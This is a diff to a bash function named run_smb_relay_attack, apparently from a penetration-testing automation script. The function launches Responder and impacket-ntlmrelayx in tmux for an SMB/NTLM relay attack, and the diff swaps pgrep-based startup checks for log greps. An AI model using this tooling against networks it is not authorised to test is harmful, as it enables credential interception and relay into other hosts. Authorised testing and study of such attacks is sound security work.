@@ -175,11 +175,12 @@ run_smb_relay_attack() {
         log ERROR "${RED}Failed to start Responder.${RESET}"
         exit 1
     }
-    sleep 2
-    pgrep -f "responder.*$network_interface" >/dev/null || {
-        log ERROR "${RED}[!] Responder failed to start.${RESET}"
+    
+    sleep 3
+    if ! grep -q "Listening for events" "$RESPONDER_LOG"; then
+        log ERROR "${RED}[!] Responder may not have started correctly.${RESET}"
         exit 1
-    }
+    fi
 
     # Start ntlmrelayx in another tmux window
     log INFO "${CYAN}Starting impacket-ntlmrelayx with target file ${TARGET_SMB_FILE}...${RESET}"
@@ -196,11 +197,12 @@ run_smb_relay_attack() {
         log ERROR "${RED}Failed to start ntlmrelayx.${RESET}"
         exit 1
     }
-    sleep 2
-    pgrep -f "impacket-ntlmrelayx" >/dev/null || {
-        log ERROR "${RED}[!] ntlmrelayx failed to start.${RESET}"
+    
+    sleep 3
+    if ! grep -q "Servers started" "$RELAY_LOG"; then
+        log ERROR "${RED}[!] ntlmrelayx may not have started correctly.${RESET}"
         exit 1
-    }
+    fi
 
     # Attach to the tmux session
     tmux -CC attach-session -t "$session_name"
